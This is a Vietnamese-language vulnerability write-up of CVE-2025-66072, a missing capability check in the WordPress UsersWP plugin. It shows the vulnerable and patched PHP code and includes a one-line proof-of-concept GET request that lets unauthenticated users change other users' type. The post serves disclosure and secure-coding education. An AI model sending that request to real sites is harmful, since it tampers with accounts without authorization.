---
title: CVE-2025-66072 Analysis & POC
description: Security Vulnerability in WordPress UsersWP Plugin.
date: 2025-12-12 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, broken access control]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng **Missing Authorization** trong **Stiofan UsersWP** cho phép khai thác **Incorrectly Configured Access Control Security Levels**. Vấn đề này ảnh hưởng đến **UsersWP**: từ **n/a** đến **<= 1.2.47**.

* **CVE ID**: [CVE-2025-66072](https://www.cve.org/CVERecord?id=CVE-2025-66072)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 1.2.47
* **Patched Versions**: 1.2.48
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress UsersWP Plugin](https://wordpress.org/plugins/userswp/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **UsersWP**:  
    * `1.2.47` – **vulnerable**  
    * `1.2.48` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đã đăng ký một action hook:

```php {title="class-admin.php" hl_lines=[] data-open=true}
add_action( 'admin_init', array( $this, 'handle_bulk_user_type_change' ) );
```

`admin_init` chạy mỗi khi bất kỳ người dùng đã đăng nhập truy cập vào trang admin (`/wp-admin/`), nhưng nó cũng được kích hoạt trong các endpoint như **`admin-ajax.php`** và **`admin-post.php`**. Vì các endpoint này cho phép truy cập cả từ Unauthenticated user, nên trong một số điều kiện, Unauthenticated user vẫn có thể khiến `admin_init` được kích hoạt dù họ không truy cập vào trang admin.

Điều này có nghĩa là bất kể user nào, chỉ cần gửi request đến `admin-ajax.php` hoặc `admin-post.php`, hook `admin_init` vẫn được chạy, và khi đó callback `handle_bulk_user_type_change` sẽ được gọi.

```php {title="class-admin.php v1.2.47" hl_lines=[16] data-open=true}
public function handle_bulk_user_type_change() {
    if ( ! isset( $_GET['uwp_change_user_type'], $_GET['uwp_new_user_type'] ) ) {
        return;
    }

    $new_user_type = absint( $_GET['uwp_new_user_type'] );

    if ( ! $new_user_type ) {
        return;
    }

    $users = isset( $_REQUEST['users'] ) && ! empty( $_REQUEST['users'] ) ? (array) $_REQUEST['users'] : array();

    if ( ! empty( $users ) ) {
        array_map( function( $user_id ) use ( $new_user_type ) {
            update_user_meta( absint( $user_id ), '_uwp_register_form_id', (int) $new_user_type );
        }, $users );
    } 

    wp_safe_redirect( add_query_arg( 'user_type_updated', 'true', admin_url( 'users.php' ) ) );
    exit;
}
```
Hàm kiểm tra xem request có chứa `uwp_change_user_type` và `uwp_new_user_type` hay không; nếu không có thì dừng lại.

Nếu có, hàm lấy giá trị `uwp_new_user_type` từ `$_GET` và chuyển thành số nguyên dương. Nếu giá trị này không hợp lệ, hàm dừng lại.

Tiếp theo, hàm lấy danh sách user từ `$_REQUEST['users']`. Nếu mảng này không rỗng, hàm thực hiện `update_user_meta()` cho từng user, cập nhật `_uwp_register_form_id` bằng giá trị `$new_user_type`.

Cuối cùng, hàm redirect về `users.php` với tham số `user_type_updated=true` và kết thúc xử lý.

![User Type](type.png "Danh sách User Type")

> [!BUG]
> **Lỗ hổng phát sinh do không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.** Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và thực hiện thay đổi User Type cho user bất kỳ, dù hành động đó lẽ ra chỉ dành cho admin.

**Bản vá (v1.2.48):** bổ sung vào hàm `handle_bulk_user_type_change`:

* Kiểm tra nonce: Hàm yêu cầu `_wpnonce` phải tồn tại và hợp lệ với action `'bulk-users'`.
```php {title="class-admin.php v1.2.48" hl_lines=[] data-open=true}
if ( ! isset( $_GET['_wpnonce'] ) || ! wp_verify_nonce( $_GET['_wpnonce'], 'bulk-users' ) ) {
    wp_die( __( 'Security check failed. Please try again.' ) );
}
```

* Kiểm tra quyền: Chỉ những user có capability `edit_users` mới được phép thực hiện thao tác.
```php {title="class-admin.php v1.2.48" hl_lines=[] data-open=true}
if ( ! current_user_can( 'edit_users' ) ) {
    wp_die( __( 'You do not have permission to perform this action.' ) );
}
```

![Diff](diff.png "Diff code")

## Flow

{{< mermaid >}}
graph TD
A["Any user (including Unauthenticated)"] --> B["Send request to admin-ajax.php or admin-post.php with uwp_change_user_type + uwp_new_user_type"]
B --> C["Hook admin_init is triggered"]
C --> D["Callback handle_bulk_user_type_change() executes"]
D --> E{"Are required GET parameters present?"}
E -- No --> F["Function exits"]
E -- Yes --> G["Retrieve uwp_new_user_type from $_GET"]
G --> H{"Is uwp_new_user_type a valid integer?"}
H -- No --> F
H -- Yes --> I["Retrieve users list from $_REQUEST['users']"]
I --> J{"Is users list not empty?"}
J -- No --> F
J -- Yes --> K["update_user_meta() for each user in the list"]
K --> L["Redirect to users.php?user_type_updated=true"]
L --> M["User Type changed without any capability check"]
{{< /mermaid >}}

## Proof of Concept (PoC)
Gửi request với Unauthenticated user:

```http
GET /wp-admin/admin-post.php?uwp_change_user_type=2&uwp_new_user_type=user_type_id&users[]=uid_1&users[]=uid_2 HTTP/1.1
Host: localhost
```

## Conclusion
CVE-2025-66072 phát sinh từ việc **thiếu kiểm tra ủy quyền** trong hàm `handle_bulk_user_type_change()` của UsersWP <= 1.2.47. Điều này cho phép **mọi người dùng, kể cả người dùng chưa đăng nhập**, thay đổi User Type của các user khác bằng cách gửi request được tạo đặc biệt tới `admin-ajax.php` hoặc `admin-post.php`. Bản vá trong phiên bản 1.2.48 đã khắc phục lỗ hổng bằng cách bổ sung **kiểm tra nonce** và **kiểm tra capability**, giới hạn hành động chỉ cho những user được phép.

## Key Takeaways

* Luôn thực hiện **kiểm tra capability** (`current_user_can`) khi thao tác với các chức năng nhạy cảm trong WordPress.
* Sử dụng **nonce** để ngăn chặn các request giả mạo hoặc không được phép.
* Không chỉ dựa vào hook như `admin_init`; đảm bảo mọi endpoint công khai đều **xác thực quyền** và **tính hợp pháp của request**.
* Người dùng với quyền thấp hoặc chưa đăng nhập có thể khai thác endpoint nếu kiểm soát truy cập không đầy đủ.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress UsersWP Plugin <= 1.2.47 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/userswp/vulnerability/wordpress-userswp-plugin-1-2-47-broken-access-control-vulnerability) 